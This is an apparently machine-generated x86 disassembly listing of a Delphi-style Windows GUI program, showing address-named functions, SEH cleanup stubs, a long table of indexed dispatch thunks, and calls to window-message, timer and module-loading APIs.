push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45ae2c
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45ae38
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45ae44
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45ae50
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45ae5c
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45ae68
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_414108
pop esi
pop ebx
retn
sub_45ae7c
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45ae98
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_414108
pop esi
pop ebx
retn
sub_45aeac
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_45aeb4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_414108
pop esi
pop ebx
retn
sub_45aec8
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_45afa4
mov eax [ eax + 0x54 ]
call sub_413fac
retn
sub_45afb0
mov eax [ eax + 0x54 ]
call sub_4142a4
retn
sub_45b203
jmp sub_403878
sub_45b247
jmp sub_403878
sub_45b24e
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_45b29c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45b09c
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_403f4c
pop esi
pop ebx
retn
sub_45b308
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_414108
pop esi
pop ebx
retn
sub_45b31c
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_45b521
jmp sub_403878
sub_45b528
pop ebx
mov esp ebp
pop ebp
retn
sub_45b530
inc [ eax + 0x8c ]
retn
sub_45b538
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_45b558
sub_45b558
xor edx edx
call sub_45b99c
retn
sub_45b98e
jmp sub_403878
sub_45ba15
jmp sub_403878
sub_45ba24
add eax 0x30
call sub_40d1c0
retn
sub_45ba68
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
j_sub_4035c4#6
jmp sub_4035c4
sub_45babe
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_45d3bc
call sub_40392c
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_45c18d
jmp sub_403878
sub_45c194
pop ebx
mov esp ebp
pop ebp
retn
sub_45c31c
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_45c348
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_45c374
xor edx edx
call sub_45c26c
retn
sub_45c37c
mov dl 0x1
call sub_45c26c
retn
sub_45c3f0
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_45c408
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_45c4d5
jmp sub_403878
sub_45c4dc
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45cc26
jmp sub_4035c4
sub_45d224
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
j_sub_4035c4#5
jmp sub_4035c4
j_sub_4035c4#4
jmp sub_4035c4
sub_45d39a
jmp sub_403878
sub_45d3a1
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45d3a8
call sub_40cd10
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_45d5a1
jmp sub_403878
sub_45d5a8
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45d66f
jmp sub_403878
sub_45d676
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d84c
jmp sub_403878
sub_45d853
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45d8b4
jmp sub_403878
sub_45d8bb
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45d8c4
call sub_45d68c
retn
sub_45daaf
jmp sub_4035c4
sub_45db08
jmp sub_403878
sub_45db0f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45dc3d
jmp sub_403878
sub_45dd9c
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_45e09b
jmp sub_403878
sub_45e0ca
jmp sub_403878
sub_45e1d6
jmp sub_403878
sub_45e1dd
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45e56e
jmp sub_403878
sub_45e575
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45e5b8
cmp [ eax + 0xa4 ] 0x0
jne r-xdata
mov eax [ eax + 0xb0 ]
retn
push 0x0
push 0x1
push 0xb031
mov eax [ eax + 0x30 ]
push eax
call SendMessageA
retn
sub_45e6e8
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_45e733
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_45e744
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_45e754
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_45e7c7
jmp sub_403878
sub_45e7ce
pop ebp
retn
sub_45e7d0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_45e764
call sub_403c48
call sub_45e6e8
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_45444c
call sub_413bfc
sub_45f43d
jmp sub_403878
sub_45f444
pop ebp
retn
sub_45f448
sub [ rw-data ] 0x1
retn
sub_45f76d
jmp sub_403878
sub_45f774
pop ebp
retn
sub_45f778
sub [ rw-data ] 0x1
retn
sub_45f784
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_45f898
jmp sub_403878
sub_45f8d0
push 0x0
push rw-data
call InterlockedExchange
test eax eax
je r-xdata
retn
push eax
call FreeLibrary
call sub_460730
sub_45f8ec
mov eax 0x0
call sub_46067c
jmp eax
sub_45f8f8
retn
sub_45f8fc
mov eax 0x1
call sub_46067c
jmp eax
sub_45f908
retn
sub_45f90c
mov eax 0x2
call sub_46067c
jmp eax
sub_45f918
retn
sub_45f91c
mov eax 0x3
call sub_46067c
jmp eax
sub_45f928
retn
sub_45f92c
mov eax 0x4
call sub_46067c
jmp eax
sub_45f938
retn
sub_45f93c
mov eax 0x5
call sub_46067c
jmp eax
sub_45f948
retn
sub_45f94c
mov eax 0x6
call sub_46067c
jmp eax
sub_45f958
retn
sub_45f95c
mov eax 0x7
call sub_46067c
jmp eax
sub_45f968
retn
sub_45f96c
mov eax 0x8
call sub_46067c
jmp eax
sub_45f978
retn
sub_45f97c
mov eax 0x9
call sub_46067c
jmp eax
sub_45f988
retn
sub_45f98c
mov eax 0xa
call sub_46067c
jmp eax
sub_45f998
retn
sub_45f99c
mov eax 0xb
call sub_46067c
jmp eax
sub_45f9a8
retn
sub_45f9ac
mov eax 0xc
call sub_46067c
jmp eax
sub_45f9b8
retn
sub_45f9bc
mov eax 0xd
call sub_46067c
jmp eax
sub_45f9c8
retn
sub_45f9cc
mov eax 0xe
call sub_46067c
jmp eax
sub_45f9d8
retn
sub_45f9dc
mov eax 0xf
call sub_46067c
jmp eax
sub_45f9e8
retn
sub_45f9ec
mov eax 0x10
call sub_46067c
jmp eax
sub_45f9f8
retn
sub_45f9fc
mov eax 0x11
call sub_46067c
jmp eax
sub_45fa08
retn
sub_45fa0c
mov eax 0x12
call sub_46067c
jmp eax
sub_45fa18
retn
sub_45fa1c
mov eax 0x13
call sub_46067c
jmp eax
sub_45fa28
retn
sub_45fa2c
mov eax 0x14
call sub_46067c
jmp eax
sub_45fa38
retn
sub_45fa3c
mov eax 0x15
call sub_46067c
jmp eax
sub_45fa48
retn
sub_45fa4c
mov eax 0x16
call sub_46067c
jmp eax
sub_45fa58
retn
sub_45fa5c
mov eax 0x17
call sub_46067c
jmp eax
sub_45fa68
retn
sub_45fa6c
mov eax 0x18
call sub_46067c
jmp eax
sub_45fa78
retn
sub_45fa7c
mov eax 0x19
call sub_46067c
jmp eax
sub_45fa88
retn
sub_45fa8c
mov eax 0x1a
call sub_46067c
jmp eax
sub_45fa98
retn
sub_45fa9c
mov eax 0x1b
call sub_46067c
jmp eax
sub_45faa8
retn
sub_45faac
mov eax 0x1c
call sub_46067c
jmp eax
sub_45fab8
retn
sub_45fabc
mov eax 0x1d
call sub_46067c
jmp eax
sub_45fac8
retn
sub_45facc
mov eax 0x1e
call sub_46067c
jmp eax
sub_45fad8
retn
sub_45fadc
mov eax 0x1f
call sub_46067c
jmp eax
sub_45fae8
retn
sub_45faec
mov eax 0x20
call sub_46067c
jmp eax
sub_45faf8
retn
sub_45fafc
mov eax 0x21
call sub_46067c
jmp eax
sub_45fb08
retn
sub_45fb0c
mov eax 0x22
call sub_46067c
jmp eax
sub_45fb18
retn
sub_45fb1c
mov eax 0x23
call sub_46067c
jmp eax
sub_45fb28
retn
sub_45fb2c
mov eax 0x24
call sub_46067c
jmp eax
sub_45fb38
retn
sub_45fb3c
mov eax 0x25
call sub_46067c
jmp eax
sub_45fb48
retn
sub_45fb4c
mov eax 0x26
call sub_46067c
jmp eax
sub_45fb58
retn
sub_45fb5c
mov eax 0x27
call sub_46067c
jmp eax
sub_45fb68
retn
sub_45fb6c
mov eax 0x28
call sub_46067c
jmp eax
sub_45fb78
retn
sub_45fb7c
mov eax 0x29
call sub_46067c
jmp eax
sub_45fb88
retn
sub_45fb8c
mov eax 0x2a
call sub_46067c
jmp eax
sub_45fb98
retn
sub_45fb9c
mov eax 0x2b
call sub_46067c
jmp eax
sub_45fba8
retn
sub_45fbac
mov eax 0x2c
call sub_46067c
jmp eax
sub_45fbb8
retn
sub_45fbbc
mov eax 0x2d
call sub_46067c
jmp eax
sub_45fbc8
retn
sub_45fbcc
mov eax 0x2e
call sub_46067c
jmp eax
sub_45fbd8
retn
sub_45fbdc
mov eax 0x2f
call sub_46067c
jmp eax
sub_45fbe8
retn
sub_45fbec
mov eax 0x30
call sub_46067c
jmp eax
sub_45fbf8
retn
sub_45fbfc
mov eax 0x31
call sub_46067c
jmp eax
sub_45fc08
retn
sub_45fc0c
mov eax 0x32
call sub_46067c
jmp eax
sub_45fc18
retn
sub_45fc1c
mov eax 0x33
call sub_46067c
jmp eax
sub_45fc28
retn
sub_45fc2c
mov eax 0x34
call sub_46067c
jmp eax
sub_45fc38
retn
sub_45fc3c
mov eax 0x35
call sub_46067c
jmp eax
sub_45fc48
retn
sub_45fc4c
mov eax 0x36
call sub_46067c
jmp eax
sub_45fc58
retn
sub_45fc5c
mov eax 0x37
call sub_46067c
jmp eax
sub_45fc68
retn
sub_45fc6c
mov eax 0x38
call sub_46067c
jmp eax
sub_45fc78
retn
sub_45fc7c
mov eax 0x39
call sub_46067c
jmp eax
sub_45fc88
retn
sub_45fc8c
mov eax 0x3a
call sub_46067c
jmp eax
sub_45fc98
retn
sub_45fc9c
mov eax 0x3b
call sub_46067c
jmp eax
sub_45fca8
retn
sub_45fcac
mov eax 0x3c
call sub_46067c
jmp eax
sub_45fcb8
retn
sub_45fcbc
mov eax 0x3d
call sub_46067c
jmp eax
sub_45fcc8
retn
sub_45fccc
mov eax 0x3e
call sub_46067c
jmp eax
sub_45fcd8
retn
sub_45fcdc
mov eax 0x3f
call sub_46067c
jmp eax
sub_45fce8
retn
sub_45fcec
mov eax 0x40
call sub_46067c
jmp eax
sub_45fcf8
retn
sub_45fcfc
mov eax 0x41
call sub_46067c
jmp eax
sub_45fd08
retn
sub_45fd0c
mov eax 0x42
call sub_46067c
jmp eax
sub_45fd18
retn
sub_45fd1c
mov eax 0x43
call sub_46067c
jmp eax
sub_45fd28
retn
sub_45fd2c
mov eax 0x44
call sub_46067c
jmp eax
sub_45fd38
retn
sub_45fd3c
mov eax 0x45
call sub_46067c
jmp eax
sub_45fd48
retn
sub_45fd4c
mov eax 0x46
call sub_46067c
jmp eax
sub_45fd58
retn
sub_45fd5c
mov eax 0x47
call sub_46067c
jmp eax
sub_45fd68
retn
sub_45fd6c
mov eax 0x48
call sub_46067c
jmp eax
sub_45fd78
retn
sub_45fd7c
mov eax 0x49
call sub_46067c
jmp eax
sub_45fd88
retn
sub_45fd8c
mov eax 0x4a
call sub_46067c
jmp eax
sub_45fd98
retn
sub_45fd9c
mov eax 0x4b
call sub_46067c
jmp eax
sub_45fda8
retn
sub_45fdac
mov eax 0x4c
call sub_46067c
jmp eax
sub_45fdb8
retn
sub_45fdbc
mov eax 0x4d
call sub_46067c
jmp eax
sub_45fdc8
retn
sub_45fdcc
mov eax 0x4e
call sub_46067c
jmp eax
sub_45fdd8
retn
sub_45fddc
mov eax 0x4f
call sub_46067c
jmp eax
sub_45fde8
retn
sub_45fdec
mov eax 0x50
call sub_46067c
jmp eax
sub_45fdf8
retn
sub_45fdfc
mov eax 0x51
call sub_46067c
jmp eax
sub_45fe08
retn
sub_45fe0c
mov eax 0x52
call sub_46067c
jmp eax
sub_45fe18
retn
sub_45fe1c
mov eax 0x53
call sub_46067c
jmp eax
sub_45fe28
retn
sub_45fe2c
mov eax 0x54
call sub_46067c
jmp eax
sub_45fe38
retn
sub_45fe3c
mov eax 0x55
call sub_46067c
jmp eax
sub_45fe48
retn
sub_45fe4c
mov eax 0x56
call sub_46067c
jmp eax
sub_45fe58
retn
sub_45fe5c
mov eax 0x57
call sub_46067c
jmp eax
sub_45fe68
retn
sub_45fe6c
mov eax 0x58
call sub_46067c
jmp eax
sub_45fe78
retn
sub_45fe7c
mov eax 0x59
call sub_46067c
jmp eax
sub_45fe88
retn
sub_45fe8c
mov eax 0x5a
call sub_46067c
jmp eax
sub_45fe98
retn
sub_45fe9c
mov eax 0x5b
call sub_46067c
jmp eax
sub_45fea8
retn
sub_45feac
mov eax 0x5c
call sub_46067c
jmp eax
sub_45feb8
retn
sub_45febc
mov eax 0x5d
call sub_46067c
jmp eax
sub_45fec8
retn
sub_45fecc
mov eax 0x5e
call sub_46067c
jmp eax
sub_45fed8
retn
sub_45fedc
mov eax 0x5f
call sub_46067c
jmp eax
sub_45fee8
retn
sub_45feec
mov eax 0x60
call sub_46067c
jmp eax
sub_45fef8
retn
sub_45fefc
mov eax 0x61
call sub_46067c
jmp eax
sub_45ff08
retn
sub_45ff0c
mov eax 0x62
call sub_46067c
jmp eax
sub_45ff18
retn
sub_45ff1c
mov eax 0x63
call sub_46067c
jmp eax
sub_45ff28
retn
sub_45ff2c
mov eax 0x64
call sub_46067c
jmp eax
sub_45ff38
retn
sub_45ff3c
mov eax 0x65
call sub_46067c
jmp eax
sub_45ff48
retn
sub_45ff4c
mov eax 0x66
call sub_46067c
jmp eax
sub_45ff58
retn
sub_45ff5c
mov eax 0x67
call sub_46067c
jmp eax
sub_45ff68
retn
sub_45ff6c
mov eax 0x68
call sub_46067c
jmp eax
sub_45ff78
retn
sub_45ff7c
mov eax 0x69
call sub_46067c
jmp eax
sub_45ff88
retn
sub_45ff8c
mov eax 0x6a
call sub_46067c
jmp eax
sub_45ff98
retn
sub_45ff9c
mov eax 0x6b
call sub_46067c
jmp eax
sub_45ffa8
retn
sub_45ffac
mov eax 0x6c
call sub_46067c
jmp eax
sub_45ffb8
retn
sub_45ffbc
mov eax 0x6d
call sub_46067c
jmp eax
sub_45ffc8
retn
sub_45ffcc
mov eax 0x6e
call sub_46067c
jmp eax
sub_45ffd8
retn
sub_45ffdc
mov eax 0x6f
call sub_46067c
jmp eax
sub_45ffe8
retn
sub_46071f
jmp sub_403878
sub_460726
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460821
jmp sub_403878
sub_460828
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46088c
jmp sub_403878
sub_460893
pop ebp
retn
sub_460898
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_460730
sub_4608cd
jmp sub_403878
sub_4608d4
pop ebp
retn
sub_4608d8
sub [ rw-data ] 0x1
retn
sub_460b64
push 0xffffffff
lea ecx [ esp + 0x4 ]
call sub_460b70
retn
sub_460c17
jmp sub_403878
sub_460c1e
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_460c76
jmp sub_403878
sub_460c7d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_460c84
test dl dl
je r-xdata
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403448
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_460ca4
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0xc ]
retn
sub_461122
jmp sub_403878
sub_461129
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46121b
jmp sub_403878
sub_461222
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4612b0
jmp sub_403878
sub_4612b7
mov eax [ ebp - 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4612e5
jmp sub_403878
sub_4612ec
pop ebp
retn
sub_4612f0
sub [ rw-data ] 0x1
retn
sub_4614ea
jmp sub_403878
sub_4614f1
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_4615cc
jmp sub_403878
sub_4615d3
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461667
jmp sub_403878
sub_46166e
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4616e4
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_461828
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4618db
jmp sub_403878
sub_4618e2
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_4619bd
jmp sub_403878
sub_4619c4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461bb0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_461bbc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x4
sub_461bd4
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_461be0
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
j_sub_4036f0#5
jmp sub_4036f0
sub_461c61
add [ eax ] eax
add [ eax ] al
shl [ eax + eax * 2 ] 0x1
insd
sbb al 0x46
add [ ebx + 0x4589fc45 ] cl
hlt
sub_461cb9
jmp sub_403878
sub_461cc0
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461dae
jmp sub_4035c4
sub_461de9
jmp sub_403878
sub_461df0
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461dfc
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_461e08
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_461eae
jmp sub_403878
sub_461eb5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461f71
jmp sub_403878
sub_461f78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461f95
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_461f8e
jmp sub_403878
sub_461f95
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_462063
jmp sub_403878
sub_46206a
pop ebx
mov esp ebp
pop ebp
retn
sub_462073
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ecx + 0x52 ] dl
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_462116
jmp sub_403878
sub_46211d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4621b6
jmp sub_403878
sub_4621bd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_462242
jmp sub_403878
sub_462249
pop ecx
pop ebp
retn
sub_46224c
mov eax [ eax + 0x4 ]
retn
sub_4622aa
jmp sub_403878
sub_4622b1
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_46238d
jmp sub_403878
sub_462394
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4623d5
jmp sub_403878
sub_4623dc
pop ebp
retn
sub_4623e0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ rw-data ]
mov edx [ sub_4612f8 ]
mov [ eax ] edx
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_461ed8
sub_462431
jmp sub_403878
sub_462438
pop ebp
retn
sub_46243c
sub [ rw-data ] 0x1
retn
sub_4625b0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_40c344
pop esi
pop ebx
retn
sub_4625c4
cmp edx eax
jge r-xdata
retn
mov eax edx
sub_46270f
jmp sub_403878
sub_462716
pop ebx
pop ecx
pop ebp
retn
sub_4627bd
jmp sub_403878
sub_4627c4
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_462899
jmp sub_403878
sub_4628a0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_462970
push ebx
mov ebx eax
mov eax ebx
call sub_4043b8
push eax
call OutputDebugStringA
pop ebx
retn
sub_462984
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
sete al
retn
sub_462998
call sub_4044fc
retn
sub_462adf
jmp sub_403878
sub_462ae6
pop ebp
retn
sub_462bbb
jmp sub_403878
sub_462bc2
pop ecx
pop ebp
retn
sub_462cf0
retn
j_sub_462cf0
jmp sub_462cf0
sub_462cf8
pop ebp
retn
sub_462cfc
sub [ rw-data ] 0x1
retn
sub_463024
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_463038
mov edx [ eax + 0x34 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x44 ]
sub_463048
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_46305c
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4c ]
sub_463095
jmp sub_403878
sub_46309c
pop ebp
retn
sub_4630a0
sub [ rw-data ] 0x1
retn
sub_46329f
jmp sub_403878
sub_4632a6
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_463381
jmp sub_403878
sub_463388
pop ebp
retn
sub_46338c
sub [ rw-data ] 0x1
retn
sub_46371a
jmp sub_403878
sub_463721
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_4637a7
jmp sub_403878
sub_4637ae
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403498
sub_463877
jmp sub_403878
sub_46387e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4639a8
jmp sub_403878
sub_4639af
pop ebp
retn
sub_4639b4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_463920
call sub_403c20
mov dl 0x1
mov eax [ r-xdata ]
call sub_428118
mov [ rw-data ] eax
sub_463f6c
jmp sub_403878
sub_463f73
pop ebx
mov esp ebp
pop ebp
retn
sub_464100
jmp sub_403878
sub_46411d
jmp sub_403878
sub_464124
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46429d
jmp sub_403878
sub_4642a4
pop ebp
retn
sub_4642a8
sub [ rw-data ] 0x1
retn
sub_464454
jmp sub_403878
sub_46445b
pop ebx
pop ecx
pop ebp
retn
sub_464520
jmp sub_403878
sub_464527
pop ebx
pop ecx
pop ebp
retn
sub_46452c
mov dl [ eax + 0x63 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
retn
sub_464538
retn
sub_464697
jmp sub_403878
sub_4646c6
jmp sub_403878
sub_4646cd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_464857
jmp sub_403878
sub_464886
jmp sub_403878
sub_46488d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_464909
jmp sub_403878
sub_464910
pop ebp
retn
sub_464914
sub [ rw-data ] 0x1
retn
sub_464a54
jmp sub_403878
sub_464a5b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_464acc
jmp sub_403878
sub_464ad3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_464b37
jmp sub_403878
sub_464b3e
pop ebx
pop ecx
pop ebp
retn
sub_464b78
retn
sub_464b79
jmp sub_403878
j_sub_464b78
jmp sub_464b78
sub_464b80
pop ebp
retn
sub_464b84
sub [ rw-data ] 0x1
retn
sub_464bb1
jmp sub_403878
sub_464bb8
pop ebp
retn
sub_464bbc
sub [ rw-data ] 0x1
retn
sub_464ca8
retn
sub_464cac
push ebp
mov ebp esp
pop ebp
retn 0x14
sub_464ce0
retn
sub_464ce4
retn
sub_464d0d
jmp sub_403878
sub_464d14
pop ebp
retn
sub_464d18
sub [ rw-data ] 0x1
retn
sub_464e88
push ebx
mov ebx eax
xor eax eax
mov [ ebx + 0xc ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea eax [ ebx + 0x14 ]
call sub_403ef8
pop ebx
retn
sub_46501b
jmp sub_403878
sub_465022
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_465077
jmp sub_403878
sub_46507e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_465084
push esi
mov esi eax
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4650e5
jmp sub_403878
sub_4650ec
pop ebp
retn
sub_4650f0
sub [ rw-data ] 0x1
retn
sub_4655f9
jmp sub_403878
sub_465600
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4036f0#3
jmp sub_4036f0
sub_4656c4
add [ eax ] eax
add [ eax ] al
int3
j_sub_4036f0#2
jmp sub_4036f0
sub_465814
add [ eax ] eax
add [ eax ] al
int3
j_sub_4035c4#3
jmp sub_4035c4
j_sub_4035c4#2
jmp sub_4035c4
sub_465c3d
jmp sub_403878
sub_465c44
pop ebp
retn
sub_465c48
sub [ rw-data ] 0x1
retn
sub_465c75
jmp sub_403878
sub_465c7c
pop ebp
retn
sub_465c80
sub [ rw-data ] 0x1
retn
sub_465cad
jmp sub_403878
sub_465cb4
pop ebp
retn
sub_465cb8
sub [ rw-data ] 0x1
retn
sub_465fd9
jmp sub_403878
sub_465fe0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465ffd
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
sub_465ff6
jmp sub_403878
sub_465ffd
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4661d5
jmp sub_403878
sub_4661dc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_4661e8
mov ecx [ eax + 0x68 ]
test ecx ecx
setne dl
test dl dl
je r-xdata
mov eax edx
retn
mov dl [ ecx + 0x10 ]
sub_466268
mov eax [ eax + 0x68 ]
call sub_463fec
retn
sub_4662e4
jmp sub_403878
sub_4662eb
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_466364
jmp sub_403878
sub_46636b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4036f0#4
